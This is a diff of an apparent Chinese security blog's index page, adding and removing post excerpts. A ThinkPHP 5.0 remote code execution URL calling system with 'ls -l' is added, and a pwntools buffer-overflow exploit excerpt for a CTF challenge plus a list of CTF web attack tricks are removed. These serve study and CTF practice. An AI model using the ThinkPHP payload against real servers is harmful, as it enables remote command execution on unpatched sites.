@@ -35,7 +35,8 @@
   <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css"  >
 
 
-<meta name="generator" content="Hexo 4.1.1"></head>
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
 
 
 <body>
@@ -135,6 +136,79 @@
               <div class="col-12 col-md-10 m-auto">
                 
 
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/03/08/PHP-RCE/">
+        <p class="h4 index-header">PHP_RCE</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">漏洞利用：ThinkPHP 5.0此框架存在远程代码执行漏洞漏洞产生的原因就在于这个控制器这里，整个thinkphp框架里的功能对控制器没有进行严格的安全过滤于检查，使攻击者可以伪造恶意参数进行强制插入，最根本的原因就是正则的表达式写的不好，导致可以绕过。
+在controller获取控制器后，直接进行赋值，但是并没有对控制器的名进行严格的检测，导致可以使用斜杠等特殊符号来远程代码注入。
+我们来搭建一下网站的环境，apache+mysql+Linux centos系统，搭建好的测试环境地址是http://127.0.01/anquan ，我们可以直接在index.php后面伪造攻击参数，示例如下：
+http://127.0.0.1/anquan/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l通过该漏洞也可以直接远程代码注入执行phpinfo语句，查询当前的php版本，路径，扩展，以及php.ini存</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-08&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/03/03/%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%81%B0%E5%BA%A6%E5%8C%96%E3%80%81%E4%BA%8C%E5%80%BC%E5%8C%96%E5%A4%84%E7%90%86/">
+        <p class="h4 index-header">图片验证码灰度化、二值化处理</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">import tesserocr
+from PIL import Image
+
+image = Image.open(&#39;code2.jpg&#39;)
+
+image = image.convert(&#39;L&#39;)
+threshold = 127
+table = []
+for i in range(256):
+    if i &lt; threshold:
+        table.append(0)
+    else:
+        table.append(1)   二：
+from PIL import  Image
+import subprocess
+
+image = Image.open(&#39;code.jpg&#39;)
+image = image.point(lambda x: 0 if x&lt;127 else 255)
+image.save(&#39;code2.jpg&#39;)
+
+subprocess.call([&quot;tesseract&quot;, &#39;code2.jpg&#39;, &quot;output&quot;]</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-03&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
 
   <div class="row mb-4 mx-auto">
     
@@ -385,76 +459,11 @@ r.recvuntil(&#39;0</div>
     </div>
   </div>
 
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/30/jarvisoj-pwn-level-2/">
-        <p class="h4 index-header">jarvisoj pwn level 4</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">level 4checksec 是x86的题目用IDA打开没有libc文件，通过查询知道了一个DynELF，可以泄露出libc从哪里开始的。下面是EXP：
-from pwn import *
-
-re = remote(&quot;pwn2.jarvisoj.com&quot;,9880)
-elf = ELF(&#39;./level4&#39;)
-write_plt = elf.symbols[&#39;write&#39;]
-vul_addr=0x804844b
-bss_addr=0x0804a024
-
-def leak(address):
-        payload = &#39;a&#39;*0x88 + &#39;a&#39;*4 + p32(write_plt) + p32(vul_addr) + p32(1) + p32(address) + p32(4)
-        re.sendline(payload)
-        data = re.recv(4)
-        return data
-wow = DynELF(leak,elf=elf)
-system</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-30&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/27/CTF-web%E8%80%83%E7%82%B9/">
-        <p class="h4 index-header">CTF web考点</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">WEB常见出题套路1.爆破：包括爆破md5、爆破随机数、验证码识别等；2.绕WAF：包括花式绕MySQL、绕文件读取关键字检测之类的拦截3.花式玩弄几个PHP特性：包括弱类型，反序列化+destruct、\0截断、iconv截断；4.密码题：包括hash长度扩展、异或、移位加密各种变形、32位随机数过小、随机数种子可预测等；5.各种找源码技巧，包括git、svn、xxx.php.swp、www.(zip|tar.gz|rar|7z)、xxx.php.bak；6.文件上传：包括花式文件后缀.php345、inc、phtml、phpt、phps、各种文件内容检测&lt;?php &lt;? &lt;%；、花式解析漏洞；7.MySQL类型差异：包括和PHP弱类型类似的特性，0x、0b、0e之类，varchar和integer相关转换，非strict模式截断等；8.open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、Directorylterator及各种二进制选手插足的方法；9.条件竞争：包括竞争删除前生成shell、竞</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-27&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
 
 
   <nav aria-label="index posts navigation">
     <span class="pagination pg-blue justify-content-center mt-5" id="pagination">
-      <a class="extend prev" rel="prev" href="/"><i class="fas fa-angle-double-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fas fa-angle-double-right"></i></a>
+      <a class="extend prev" rel="prev" href="/"><i class="fas fa-angle-double-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/"><i class="fas fa-angle-double-right"></i></a>
     </span>
   </nav>
   
